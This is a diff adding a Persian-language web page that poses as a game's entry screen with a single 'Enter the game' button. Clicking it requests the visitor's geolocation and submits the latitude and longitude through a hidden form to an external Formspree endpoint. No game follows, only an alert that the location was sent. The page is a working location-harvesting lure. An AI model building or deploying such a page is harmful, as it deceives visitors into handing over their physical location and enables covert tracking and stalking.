@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>ورود به بازی</title>
+  <style>
+    body {
+      background-color: pink;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      direction: rtl;
+      font-family: sans-serif;
+    }
+    button {
+      font-size: 24px;
+      padding: 15px 30px;
+      background-color: white;
+      border: 2px solid #555;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <button onclick="getLocation()">ورود به بازی</button>
+
+  <form id="locationForm" method="POST" action="https://formspree.io/f/meozoyeq" style="display:none;">
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+  </form>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          document.getElementById("latitude").value = position.coords.latitude;
+          document.getElementById("longitude").value = position.coords.longitude;
+          document.getElementById("locationForm").submit();
+          alert("موقعیت شما ارسال شد.");
+        }, function(error) {
+          alert("خطا در دریافت موقعیت: " + error.message);
+        });
+      } else {
+        alert("مرورگر شما موقعیت مکانی را پشتیبانی نمی‌کند.");
+      }
+    }
+  </script>
+
+</body>
+</html>
